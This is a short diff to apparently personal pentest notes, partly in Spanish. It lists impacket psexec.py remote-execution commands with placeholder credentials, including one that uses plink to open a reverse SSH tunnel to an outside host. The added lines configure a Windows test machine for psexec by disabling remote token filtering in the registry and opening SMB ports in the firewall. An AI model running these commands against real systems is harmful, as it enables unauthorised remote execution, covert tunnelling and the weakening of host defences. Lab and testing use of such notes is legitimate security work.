@@ -18,3 +18,12 @@ psexec.py 'user_ssh:pass_ssh'@'ip' "C:\plink.exe -batch -hostkey 'hostkey' -N -R
 psexec.py 'user:pass@ip'
 psexec.py WORKGROUP/user:pass@ip CMD
 psexec.py DOMAIN/USER:PASS@ip CMD
+
+# impacket-psexec windows test config:
++ crear dword(32) LocalAccountTokenFilterPolicy valor 1 en
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system
+
++ abrir los puertos 139 (udp) 445 (tcp)
+netsh advfirewall firewall add rule name="psexec-tcp" dir=in action=allow protocol=TCP localport=445
+netsh advfirewall firewall add rule name="psexec-udp" dir=in action=allow protocol=UDP localport=137
+
